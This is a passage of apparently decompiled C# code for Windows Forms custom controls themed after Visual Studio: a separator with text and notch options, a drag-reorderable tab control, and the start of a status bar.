			graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
		}
	}
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class VisualStudioSeperator : Control
	{
		public enum __TextLocation
		{
			Left,
			Middle,
			Right
		}

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private Color _FontColour;

		private Color _LineColour;

		private Font _Font;

		private bool _ShowText;

		private StringAlignment _TextAlignment;

		private VisualStudioSeperator.__TextLocation _TextLocation;

		private bool _AddEndNotch;

		private bool _UnderlineText;

		private bool _ShowTextAboveLine;

		private bool _OnlyUnderlineText;

		[Category("Control")]
		public VisualStudioSeperator.__TextLocation TextLocation
		{
			get
			{
				return this._TextLocation;
			}
			set
			{
				this._TextLocation = value;
				this.Invalidate();
			}
		}

		[Category("Control")]
		public StringAlignment TextAlignment
		{
			get
			{
				return this._TextAlignment;
			}
			set
			{
				this._TextAlignment = value;
				this.Invalidate();
			}
		}

		[Category("Control")]
		public bool ShowTextAboveLine
		{
			get
			{
				return this._ShowTextAboveLine;
			}
			set
			{
				this._ShowTextAboveLine = value;
				this.Invalidate();
			}
		}

		[Category("Control")]
		public bool OnlyUnderlineText
		{
			get
			{
				return this._OnlyUnderlineText;
			}
			set
			{
				this._OnlyUnderlineText = value;
				this.Invalidate();
			}
		}

		[Category("Control")]
		public bool UnderlineText
		{
			get
			{
				return this._UnderlineText;
			}
			set
			{
				this._UnderlineText = value;
				this.Invalidate();
			}
		}

		[Category("Control")]
		public bool AddEndNotch
		{
			get
			{
				return this._AddEndNotch;
			}
			set
			{
				this._AddEndNotch = value;
				this.Invalidate();
			}
		}

		[Category("Control")]
		public bool ShowText
		{
			get
			{
				return this._ShowText;
			}
			set
			{
				this._ShowText = value;
				this.Invalidate();
			}
		}

		[Category("Colours")]
		public Color LineColour
		{
			get
			{
				return this._LineColour;
			}
			set
			{
				this._LineColour = value;
			}
		}

		[Category("Colours")]
		public Color FontColour
		{
			get
			{
				return this._FontColour;
			}
			set
			{
				this._FontColour = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = VisualStudioSeperator.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = VisualStudioSeperator.__ENCList.Count == VisualStudioSeperator.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = VisualStudioSeperator.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = VisualStudioSeperator.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									VisualStudioSeperator.__ENCList[num] = VisualStudioSeperator.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						VisualStudioSeperator.__ENCList.RemoveRange(num, VisualStudioSeperator.__ENCList.Count - num);
						VisualStudioSeperator.__ENCList.Capacity = VisualStudioSeperator.__ENCList.Count;
					}
					VisualStudioSeperator.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected override void OnSizeChanged(EventArgs e)
		{
			base.OnSizeChanged(e);
			bool flag = this._ShowText && (float)this.Height < this.Font.Size * 2f + 3f;
			if (flag)
			{
				Size size = new Size(this.Width, checked((int)Math.Round((double)(unchecked(this.Font.Size * 2f + 3f)))));
				this.Size = size;
			}
			this.Invalidate();
		}

		public VisualStudioSeperator()
		{
			VisualStudioSeperator.__ENCAddToList(this);
			this._FontColour = Color.FromArgb(153, 153, 153);
			this._LineColour = Color.FromArgb(0, 122, 204);
			this._Font = new Font("Microsoft Sans Serif", 8f);
			this._TextAlignment = StringAlignment.Center;
			this._TextLocation = VisualStudioSeperator.__TextLocation.Left;
			this._AddEndNotch = false;
			this._UnderlineText = false;
			this._ShowTextAboveLine = false;
			this._OnlyUnderlineText = false;
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			this.BackColor = Color.Transparent;
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Graphics graphics2 = graphics;
			graphics2.TextRenderingHint = TextRenderingHint.AntiAlias;
			graphics2.SmoothingMode = SmoothingMode.AntiAlias;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			bool flag = this._ShowText && !this._ShowTextAboveLine;
			checked
			{
				if (flag)
				{
					switch (this._TextLocation)
					{
					case VisualStudioSeperator.__TextLocation.Left:
					{
						Graphics arg_D8_0 = graphics2;
						string arg_D8_1 = this.Text;
						Font arg_D8_2 = this.Font;
						Brush arg_D8_3 = new SolidBrush(this._FontColour);
						Rectangle r = new Rectangle(0, 0, (int)Math.Round((double)(unchecked(graphics2.MeasureString(this.Text, this.Font).Width + 10f))), this.Height);
						arg_D8_0.DrawString(arg_D8_1, arg_D8_2, arg_D8_3, r, new StringFormat
						{
							Alignment = this._TextAlignment,
							LineAlignment = StringAlignment.Center
						});
						Graphics arg_15A_0 = graphics2;
						Pen arg_15A_1 = new Pen(this._LineColour);
						Point point = new Point((int)Math.Round((double)(unchecked(graphics2.MeasureString(this.Text, this.Font).Width + 20f))), (int)Math.Round((double)this.Height / 2.0));
						Point arg_15A_2 = point;
						Point point2 = new Point(this.Width, (int)Math.Round((double)this.Height / 2.0));
						arg_15A_0.DrawLine(arg_15A_1, arg_15A_2, point2);
						flag = this._AddEndNotch;
						if (flag)
						{
							Graphics arg_212_0 = graphics2;
							Pen arg_212_1 = new Pen(this._LineColour);
							point2 = new Point(this.Width - 1, (int)Math.Round(unchecked((double)this.Height / 2.0 - (double)(graphics2.MeasureString(this.Text, this.Font).Height / 2f))));
							Point arg_212_2 = point2;
							point = new Point(this.Width - 1, (int)Math.Round(unchecked((double)this.Height / 2.0 + (double)(graphics2.MeasureString(this.Text, this.Font).Height / 2f))));
							arg_212_0.DrawLine(arg_212_1, arg_212_2, point);
						}
						flag = this._UnderlineText;
						if (flag)
						{
							graphics2.DrawLine(new Pen(this._LineColour), 0, (int)Math.Round(unchecked((double)this.Height / 2.0 + (double)(graphics2.MeasureString(this.Text, this.Font).Height / 2f))) + 3, (int)Math.Round((double)(unchecked(graphics2.MeasureString(this.Text, this.Font).Width + 20f))), (int)Math.Round(unchecked((double)this.Height / 2.0 + (double)(graphics2.MeasureString(this.Text, this.Font).Height / 2f))) + 3);
							graphics2.DrawLine(new Pen(this._LineColour), (int)Math.Round((double)(unchecked(graphics2.MeasureString(this.Text, this.Font).Width + 20f))), (int)Math.Round(unchecked((double)this.Height / 2.0 + (double)(graphics2.MeasureString(this.Text, this.Font).Height / 2f))) + 3, (int)Math.Round((double)(unchecked(graphics2.MeasureString(this.Text, this.Font).Width + 20f))), (int)Math.Round((double)this.Height / 2.0));
						}
						break;
					}
					case VisualStudioSeperator.__TextLocation.Middle:
					{
						Graphics arg_44F_0 = graphics2;
						string arg_44F_1 = this.Text;
						Font arg_44F_2 = this.Font;
						Brush arg_44F_3 = new SolidBrush(this._FontColour);
						Rectangle r = new Rectangle((int)Math.Round(unchecked((double)this.Width / 2.0 - (double)(graphics2.MeasureString(this.Text, this.Font).Width / 2f) - 10.0)), 0, (int)Math.Round((double)graphics2.MeasureString(this.Text, this.Font).Width) + 10, this.Height);
						arg_44F_0.DrawString(arg_44F_1, arg_44F_2, arg_44F_3, r, new StringFormat
						{
							Alignment = this._TextAlignment,
							LineAlignment = StringAlignment.Center
						});
						Graphics arg_4E8_0 = graphics2;
						Pen arg_4E8_1 = new Pen(this._LineColour);
						Point point2 = new Point(0, (int)Math.Round((double)this.Height / 2.0));
						Point arg_4E8_2 = point2;
						Point point = new Point((int)Math.Round(unchecked((double)this.Width / 2.0 - (double)(graphics2.MeasureString(this.Text, this.Font).Width / 2f) - 20.0)), (int)Math.Round((double)this.Height / 2.0));
						arg_4E8_0.DrawLine(arg_4E8_1, arg_4E8_2, point);
						Graphics arg_586_0 = graphics2;
						Pen arg_586_1 = new Pen(this._LineColour);
						point2 = new Point((int)Math.Round(unchecked((double)this.Width / 2.0 + (double)(graphics2.MeasureString(this.Text, this.Font).Width / 2f) + 10.0)), (int)Math.Round((double)this.Height / 2.0));
						Point arg_586_2 = point2;
						point = new Point(this.Width, (int)Math.Round((double)this.Height / 2.0));
						arg_586_0.DrawLine(arg_586_1, arg_586_2, point);
						flag = this._AddEndNotch;
						if (flag)
						{
							Graphics arg_63F_0 = graphics2;
							Pen arg_63F_1 = new Pen(this._LineColour);
							point2 = new Point(this.Width - 1, (int)Math.Round(unchecked((double)this.Height / 2.0 - (double)(graphics2.MeasureString(this.Text, this.Font).Height / 2f))));
							Point arg_63F_2 = point2;
							point = new Point(this.Width - 1, (int)Math.Round(unchecked((double)this.Height / 2.0 + (double)(graphics2.MeasureString(this.Text, this.Font).Height / 2f))));
							arg_63F_0.DrawLine(arg_63F_1, arg_63F_2, point);
							Graphics arg_6DB_0 = graphics2;
							Pen arg_6DB_1 = new Pen(this._LineColour);
							point2 = new Point(1, (int)Math.Round(unchecked((double)this.Height / 2.0 - (double)(graphics2.MeasureString(this.Text, this.Font).Height / 2f))));
							Point arg_6DB_2 = point2;
							point = new Point(1, (int)Math.Round(unchecked((double)this.Height / 2.0 + (double)(graphics2.MeasureString(this.Text, this.Font).Height / 2f))));
							arg_6DB_0.DrawLine(arg_6DB_1, arg_6DB_2, point);
						}
						flag = this._UnderlineText;
						if (flag)
						{
							graphics2.DrawLine(new Pen(this._LineColour), (int)Math.Round(unchecked((double)this.Width / 2.0 - (double)(graphics2.MeasureString(this.Text, this.Font).Width / 2f) - 20.0)), (int)Math.Round((double)this.Height / 2.0), (int)Math.Round(unchecked((double)this.Width / 2.0 - (double)(graphics2.MeasureString(this.Text, this.Font).Width / 2f) - 20.0)), (int)Math.Round(unchecked((double)this.Height / 2.0 + (double)(graphics2.MeasureString(this.Text, this.Font).Height / 2f))) + 3);
							graphics2.DrawLine(new Pen(this._LineColour), (int)Math.Round(unchecked((double)this.Width / 2.0 + (double)(graphics2.MeasureString(this.Text, this.Font).Width / 2f) + 10.0)), (int)Math.Round((double)this.Height / 2.0), (int)Math.Round(unchecked((double)this.Width / 2.0 + (double)(graphics2.MeasureString(this.Text, this.Font).Width / 2f) + 10.0)), (int)Math.Round(unchecked((double)this.Height / 2.0 + (double)(graphics2.MeasureString(this.Text, this.Font).Height / 2f))) + 3);
							graphics2.DrawLine(new Pen(this._LineColour), (int)Math.Round(unchecked((double)this.Width / 2.0 - (double)(graphics2.MeasureString(this.Text, this.Font).Width / 2f) - 20.0)), (int)Math.Round(unchecked((double)this.Height / 2.0 + (double)(graphics2.MeasureString(this.Text, this.Font).Height / 2f))) + 3, (int)Math.Round(unchecked((double)this.Width / 2.0 + (double)(graphics2.MeasureString(this.Text, this.Font).Width / 2f) + 10.0)), (int)Math.Round(unchecked((double)this.Height / 2.0 + (double)(graphics2.MeasureString(this.Text, this.Font).Height / 2f))) + 3);
						}
						break;
					}
					case VisualStudioSeperator.__TextLocation.Right:
					{
						Graphics arg_A89_0 = graphics2;
						string arg_A89_1 = this.Text;
						Font arg_A89_2 = this.Font;
						Brush arg_A89_3 = new SolidBrush(this._FontColour);
						Rectangle r = new Rectangle((int)Math.Round((double)(unchecked((float)this.Width - graphics2.MeasureString(this.Text, this.Font).Width - 10f))), 0, (int)Math.Round((double)(unchecked(graphics2.MeasureString(this.Text, this.Font).Width + 10f))), this.Height);
						arg_A89_0.DrawString(arg_A89_1, arg_A89_2, arg_A89_3, r, new StringFormat
						{
							Alignment = this._TextAlignment,
							LineAlignment = StringAlignment.Center
						});
						Graphics arg_B0F_0 = graphics2;
						Pen arg_B0F_1 = new Pen(this._LineColour);
						Point point2 = new Point(0, (int)Math.Round((double)this.Height / 2.0));
						Point arg_B0F_2 = point2;
						Point point = new Point((int)Math.Round((double)(unchecked((float)this.Width - graphics2.MeasureString(this.Text, this.Font).Width - 20f))), (int)Math.Round((double)this.Height / 2.0));
						arg_B0F_0.DrawLine(arg_B0F_1, arg_B0F_2, point);
						flag = this._AddEndNotch;
						if (flag)
						{
							Graphics arg_BBA_0 = graphics2;
							Pen arg_BBA_1 = new Pen(this._LineColour);
							point2 = new Point(1, (int)Math.Round(unchecked((double)this.Height / 2.0 - (double)(graphics2.MeasureString(this.Text, this.Font).Height / 2f))));
							Point arg_BBA_2 = point2;
							point = new Point(1, (int)Math.Round(unchecked((double)this.Height / 2.0 + (double)(graphics2.MeasureString(this.Text, this.Font).Height / 2f))));
							arg_BBA_0.DrawLine(arg_BBA_1, arg_BBA_2, point);
						}
						flag = this._UnderlineText;
						if (flag)
						{
							graphics2.DrawLine(new Pen(this._LineColour), (int)Math.Round((double)(unchecked((float)this.Width - graphics2.MeasureString(this.Text, this.Font).Width - 20f))), (int)Math.Round(unchecked((double)this.Height / 2.0 + (double)(graphics2.MeasureString(this.Text, this.Font).Height / 2f))) + 3, this.Width, (int)Math.Round(unchecked((double)this.Height / 2.0 + (double)(graphics2.MeasureString(this.Text, this.Font).Height / 2f))) + 3);
							graphics2.DrawLine(new Pen(this._LineColour), (int)Math.Round((double)(unchecked((float)this.Width - graphics2.MeasureString(this.Text, this.Font).Width - 20f))), (int)Math.Round(unchecked((double)this.Height / 2.0 + (double)(graphics2.MeasureString(this.Text, this.Font).Height / 2f))) + 3, (int)Math.Round((double)(unchecked((float)this.Width - graphics2.MeasureString(this.Text, this.Font).Width - 20f))), (int)Math.Round((double)this.Height / 2.0));
						}
						break;
					}
					}
				}
				else
				{
					flag = (this._ShowText && this._ShowTextAboveLine);
					if (flag)
					{
						bool flag2 = this._OnlyUnderlineText;
						if (flag2)
						{
							Graphics arg_E07_0 = graphics2;
							Pen arg_E07_1 = new Pen(this._LineColour);
							Point point2 = new Point(5, (int)Math.Round((double)this.Height / 2.0) + 6);
							Point arg_E07_2 = point2;
							Point point = new Point((int)Math.Round((double)(unchecked(graphics2.MeasureString(this.Text, this.Font).Width + 8f))), (int)Math.Round((double)this.Height / 2.0) + 6);
							arg_E07_0.DrawLine(arg_E07_1, arg_E07_2, point);
							Graphics arg_E7B_0 = graphics2;
							string arg_E7B_1 = this.Text;
							Font arg_E7B_2 = this.Font;
							Brush arg_E7B_3 = new SolidBrush(this._FontColour);
							Rectangle r = new Rectangle(5, 0, this.Width - 10, (int)Math.Round(unchecked((double)this.Height / 2.0 + 3.0)));
							arg_E7B_0.DrawString(arg_E7B_1, arg_E7B_2, arg_E7B_3, r, new StringFormat
							{
								Alignment = StringAlignment.Near,
								LineAlignment = StringAlignment.Far
							});
						}
						else
						{
							Graphics arg_EE0_0 = graphics2;
							Pen arg_EE0_1 = new Pen(this._LineColour);
							Point point2 = new Point(0, (int)Math.Round((double)this.Height / 2.0) + 6);
							Point arg_EE0_2 = point2;
							Point point = new Point(this.Width, (int)Math.Round((double)this.Height / 2.0) + 6);
							arg_EE0_0.DrawLine(arg_EE0_1, arg_EE0_2, point);
							flag2 = this._AddEndNotch;
							if (flag2)
							{
								Graphics arg_F5F_0 = graphics2;
								Pen arg_F5F_1 = new Pen(this._LineColour);
								point2 = new Point(this.Width - 1, (int)Math.Round((double)this.Height / 2.0) - 5);
								Point arg_F5F_2 = point2;
								point = new Point(this.Width - 1, (int)Math.Round(unchecked((double)this.Height / 2.0 + 5.0)));
								arg_F5F_0.DrawLine(arg_F5F_1, arg_F5F_2, point);
								Graphics arg_FC1_0 = graphics2;
								Pen arg_FC1_1 = new Pen(this._LineColour);
								point2 = new Point(1, (int)Math.Round((double)this.Height / 2.0) - 5);
								Point arg_FC1_2 = point2;
								point = new Point(1, (int)Math.Round(unchecked((double)this.Height / 2.0 + 5.0)));
								arg_FC1_0.DrawLine(arg_FC1_1, arg_FC1_2, point);
							}
							Graphics arg_103B_0 = graphics2;
							string arg_103B_1 = this.Text;
							Font arg_103B_2 = this.Font;
							Brush arg_103B_3 = new SolidBrush(this._FontColour);
							Rectangle r = new Rectangle(5, 0, this.Width - 10, (int)Math.Round(unchecked((double)this.Height / 2.0 + 3.0)));
							arg_103B_0.DrawString(arg_103B_1, arg_103B_2, arg_103B_3, r, new StringFormat
							{
								Alignment = this._TextAlignment,
								LineAlignment = StringAlignment.Far
							});
						}
					}
					else
					{
						bool flag2 = this._OnlyUnderlineText;
						if (flag2)
						{
							Graphics arg_10D3_0 = graphics2;
							Pen arg_10D3_1 = new Pen(this._LineColour);
							Point point2 = new Point(5, (int)Math.Round((double)this.Height / 2.0) + 6);
							Point arg_10D3_2 = point2;
							Point point = new Point((int)Math.Round((double)(unchecked(graphics2.MeasureString(this.Text, this.Font).Width + 8f))), (int)Math.Round((double)this.Height / 2.0) + 6);
							arg_10D3_0.DrawLine(arg_10D3_1, arg_10D3_2, point);
							Graphics arg_1147_0 = graphics2;
							string arg_1147_1 = this.Text;
							Font arg_1147_2 = this.Font;
							Brush arg_1147_3 = new SolidBrush(this._FontColour);
							Rectangle r = new Rectangle(5, 0, this.Width - 10, (int)Math.Round(unchecked((double)this.Height / 2.0 + 3.0)));
							arg_1147_0.DrawString(arg_1147_1, arg_1147_2, arg_1147_3, r, new StringFormat
							{
								Alignment = StringAlignment.Near,
								LineAlignment = StringAlignment.Far
							});
						}
						else
						{
							Graphics arg_11A8_0 = graphics2;
							Pen arg_11A8_1 = new Pen(this._LineColour);
							Point point2 = new Point(0, (int)Math.Round((double)this.Height / 2.0));
							Point arg_11A8_2 = point2;
							Point point = new Point(this.Width, (int)Math.Round((double)this.Height / 2.0));
							arg_11A8_0.DrawLine(arg_11A8_1, arg_11A8_2, point);
							flag2 = this._AddEndNotch;
							if (flag2)
							{
								Graphics arg_1261_0 = graphics2;
								Pen arg_1261_1 = new Pen(this._LineColour);
								point2 = new Point(this.Width - 1, (int)Math.Round(unchecked((double)this.Height / 2.0 - (double)(graphics2.MeasureString(this.Text, this.Font).Height / 2f))));
								Point arg_1261_2 = point2;
								point = new Point(this.Width - 1, (int)Math.Round(unchecked((double)this.Height / 2.0 + (double)(graphics2.MeasureString(this.Text, this.Font).Height / 2f))));
								arg_1261_0.DrawLine(arg_1261_1, arg_1261_2, point);
								Graphics arg_12FD_0 = graphics2;
								Pen arg_12FD_1 = new Pen(this._LineColour);
								point2 = new Point(1, (int)Math.Round(unchecked((double)this.Height / 2.0 - (double)(graphics2.MeasureString(this.Text, this.Font).Height / 2f))));
								Point arg_12FD_2 = point2;
								point = new Point(1, (int)Math.Round(unchecked((double)this.Height / 2.0 + (double)(graphics2.MeasureString(this.Text, this.Font).Height / 2f))));
								arg_12FD_0.DrawLine(arg_12FD_1, arg_12FD_2, point);
							}
						}
					}
				}
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
			}
		}
	}
}

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class VisualStudioTabControl : TabControl
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private Color _TextColour;

		private Color _BackTabColour;

		private Color _BaseColour;

		private Color _ActiveColour;

		private Color _BorderColour;

		private Color _HorizLineColour;

		private StringFormat CenterSF;

		private TabPage predraggedTab;

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[Category("Colours")]
		public Color HorizontalLineColour
		{
			get
			{
				return this._HorizLineColour;
			}
			set
			{
				this._HorizLineColour = value;
			}
		}

		[Category("Colours")]
		public Color TextColour
		{
			get
			{
				return this._TextColour;
			}
			set
			{
				this._TextColour = value;
			}
		}

		[Category("Colours")]
		public Color BackTabColour
		{
			get
			{
				return this._BackTabColour;
			}
			set
			{
				this._BackTabColour = value;
			}
		}

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
			}
		}

		[Category("Colours")]
		public Color ActiveColour
		{
			get
			{
				return this._ActiveColour;
			}
			set
			{
				this._ActiveColour = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = VisualStudioTabControl.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = VisualStudioTabControl.__ENCList.Count == VisualStudioTabControl.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = VisualStudioTabControl.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = VisualStudioTabControl.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									VisualStudioTabControl.__ENCList[num] = VisualStudioTabControl.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						VisualStudioTabControl.__ENCList.RemoveRange(num, VisualStudioTabControl.__ENCList.Count - num);
						VisualStudioTabControl.__ENCList.Capacity = VisualStudioTabControl.__ENCList.Count;
					}
					VisualStudioTabControl.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected override void CreateHandle()
		{
			base.CreateHandle();
			this.Alignment = TabAlignment.Top;
		}

		protected override void OnMouseDown(MouseEventArgs e)
		{
			this.predraggedTab = this.getPointedTab();
			base.OnMouseDown(e);
		}

		protected override void OnMouseUp(MouseEventArgs e)
		{
			this.predraggedTab = null;
			base.OnMouseUp(e);
		}

		protected override void OnMouseMove(MouseEventArgs e)
		{
			bool flag = e.Button == MouseButtons.Left && this.predraggedTab != null;
			if (flag)
			{
				this.DoDragDrop(this.predraggedTab, DragDropEffects.Move);
			}
			base.OnMouseMove(e);
		}

		protected override void OnDragOver(DragEventArgs drgevent)
		{
			TabPage tabPage = (TabPage)drgevent.Data.GetData(typeof(TabPage));
			TabPage pointedTab = this.getPointedTab();
			bool flag = tabPage == this.predraggedTab && pointedTab != null;
			if (flag)
			{
				drgevent.Effect = DragDropEffects.Move;
				flag = (pointedTab != tabPage);
				if (flag)
				{
					this.swapTabPages(tabPage, pointedTab);
				}
			}
			base.OnDragOver(drgevent);
		}

		private TabPage getPointedTab()
		{
			int arg_10_0 = 0;
			checked
			{
				int num = this.TabPages.Count - 1;
				int num2 = arg_10_0;
				while (true)
				{
					int arg_4E_0 = num2;
					int num3 = num;
					if (arg_4E_0 > num3)
					{
						goto Block_2;
					}
					bool flag = this.GetTabRect(num2).Contains(this.PointToClient(Cursor.Position));
					if (flag)
					{
						break;
					}
					num2++;
				}
				TabPage result = this.TabPages[num2];
				return result;
				Block_2:
				result = null;
				return result;
			}
		}

		private void swapTabPages(TabPage src, TabPage dst)
		{
			int num = this.TabPages.IndexOf(src);
			int num2 = this.TabPages.IndexOf(dst);
			this.TabPages[num2] = src;
			this.TabPages[num] = dst;
			bool flag = this.SelectedIndex == num;
			if (flag)
			{
				this.SelectedIndex = num2;
			}
			else
			{
				flag = (this.SelectedIndex == num2);
				if (flag)
				{
					this.SelectedIndex = num;
				}
			}
			this.Refresh();
		}

		public VisualStudioTabControl()
		{
			VisualStudioTabControl.__ENCAddToList(this);
			this._TextColour = Color.FromArgb(255, 255, 255);
			this._BackTabColour = Color.FromArgb(28, 28, 28);
			this._BaseColour = Color.FromArgb(45, 45, 48);
			this._ActiveColour = Color.FromArgb(0, 122, 204);
			this._BorderColour = Color.FromArgb(30, 30, 30);
			this._HorizLineColour = Color.FromArgb(0, 122, 204);
			this.CenterSF = new StringFormat
			{
				Alignment = StringAlignment.Near,
				LineAlignment = StringAlignment.Center
			};
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			this.SizeMode = TabSizeMode.Normal;
			Size itemSize = new Size(240, 16);
			this.ItemSize = itemSize;
			this.AllowDrop = true;
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Graphics graphics2 = graphics;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.Clear(this._BaseColour);
			try
			{
				this.SelectedTab.BackColor = this._BackTabColour;
			}
			catch (Exception arg_49_0)
			{
				ProjectData.SetProjectError(arg_49_0);
				ProjectData.ClearProjectError();
			}
			try
			{
				this.SelectedTab.BorderStyle = BorderStyle.None;
			}
			catch (Exception arg_67_0)
			{
				ProjectData.SetProjectError(arg_67_0);
				ProjectData.ClearProjectError();
			}
			int arg_80_0 = 0;
			checked
			{
				int num = this.TabCount - 1;
				int num2 = arg_80_0;
				Point location;
				Point point;
				Rectangle tabRect;
				while (true)
				{
					int arg_1FE_0 = num2;
					int num3 = num;
					if (arg_1FE_0 > num3)
					{
						break;
					}
					int arg_BE_1 = this.GetTabRect(num2).Location.X + 2;
					location = this.GetTabRect(num2).Location;
					point = new Point(arg_BE_1, location.Y);
					Point arg_F0_1 = point;
					int arg_E8_1 = this.GetTabRect(num2).Width;
					tabRect = this.GetTabRect(num2);
					Size size = new Size(arg_E8_1, tabRect.Height);
					Rectangle rectangle = new Rectangle(arg_F0_1, size);
					Point arg_117_1 = rectangle.Location;
					size = new Size(rectangle.Width, rectangle.Height);
					Rectangle rectangle2 = new Rectangle(arg_117_1, size);
					bool flag = num2 == this.SelectedIndex;
					if (flag)
					{
						graphics2.FillRectangle(new SolidBrush(this._BaseColour), rectangle2);
						Graphics arg_17C_0 = graphics2;
						Brush arg_17C_1 = new SolidBrush(this._ActiveColour);
						tabRect = new Rectangle(rectangle.X - 5, rectangle.Y - 3, rectangle.Width, rectangle.Height + 5);
						arg_17C_0.FillRectangle(arg_17C_1, tabRect);
						graphics2.DrawString(this.TabPages[num2].Text, this.Font, new SolidBrush(this._TextColour), rectangle2, this.CenterSF);
					}
					else
					{
						graphics2.DrawString(this.TabPages[num2].Text, this.Font, new SolidBrush(this._TextColour), rectangle2, this.CenterSF);
					}
					num2++;
				}
				Graphics arg_234_0 = graphics2;
				Pen arg_234_1 = new Pen(this._HorizLineColour, 2f);
				point = new Point(0, 19);
				Point arg_234_2 = point;
				location = new Point(this.Width, 19);
				arg_234_0.DrawLine(arg_234_1, arg_234_2, location);
				Graphics arg_263_0 = graphics2;
				Brush arg_263_1 = new SolidBrush(this._BackTabColour);
				tabRect = new Rectangle(0, 20, this.Width, this.Height - 20);
				arg_263_0.FillRectangle(arg_263_1, tabRect);
				Graphics arg_293_0 = graphics2;
				Pen arg_293_1 = new Pen(this._BorderColour, 2f);
				tabRect = new Rectangle(0, 0, this.Width, this.Height);
				arg_293_0.DrawRectangle(arg_293_1, tabRect);
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
				graphics2 = null;
			}
		}
	}
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class VisualStudioStatusBar : Control
	{
		public enum LinesCount
		{
			None,
			One,
			Two
		}

		public enum AmountOfStrings
		{
			One,
			Two,
			Three
		}

		public enum Alignments
		{
			Left,
			Center,
			Right
		}

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private Color _TextColour;

		private Color _BaseColour;

		private Color _RectColour;

		private Color _BorderColour;

		private Color _SeperatorColour;

		private bool _ShowLine;

		private VisualStudioStatusBar.LinesCount _LinesToShow;

		private VisualStudioStatusBar.AmountOfStrings _NumberOfStrings;

		private bool _ShowBorder;

		private StringFormat _FirstLabelStringFormat;

		private string _FirstLabelText;

		private VisualStudioStatusBar.Alignments _FirstLabelAlignment;

		private StringFormat _SecondLabelStringFormat;

		private string _SecondLabelText;

		private VisualStudioStatusBar.Alignments _SecondLabelAlignment;

		private StringFormat _ThirdLabelStringFormat;

		private string _ThirdLabelText;

		private VisualStudioStatusBar.Alignments _ThirdLabelAlignment;

		[Category("First Label Options")]
		public string FirstLabelText
		{
			get
			{
				return this._FirstLabelText;
			}
			set
			{
				this._FirstLabelText = value;
			}
		}

		[Category("First Label Options")]
		public VisualStudioStatusBar.Alignments FirstLabelAlignment
		{
			get
			{
				return this._FirstLabelAlignment;
			}
			set
			{
				switch (value)
				{
				case VisualStudioStatusBar.Alignments.Left:
					this._FirstLabelStringFormat = new StringFormat
					{
						Alignment = StringAlignment.Near,
						LineAlignment = StringAlignment.Center
					};
					this._FirstLabelAlignment = value;
					break;
				case VisualStudioStatusBar.Alignments.Center:
					this._FirstLabelStringFormat = new StringFormat
					{
						Alignment = StringAlignment.Center,
						LineAlignment = StringAlignment.Center
					};
					this._FirstLabelAlignment = value;
					break;
				case VisualStudioStatusBar.Alignments.Right:
					this._FirstLabelStringFormat = new StringFormat
					{
						Alignment = StringAlignment.Far,
						LineAlignment = StringAlignment.Center
					};
					this._FirstLabelAlignment = value;
					break;
				}
			}
		}

		[Category("Second Label Options")]
		public string SecondLabelText
		{
			get
			{
				return this._SecondLabelText;
			}
			set
			{
				this._SecondLabelText = value;
			}
		}

		[Category("Second Label Options")]
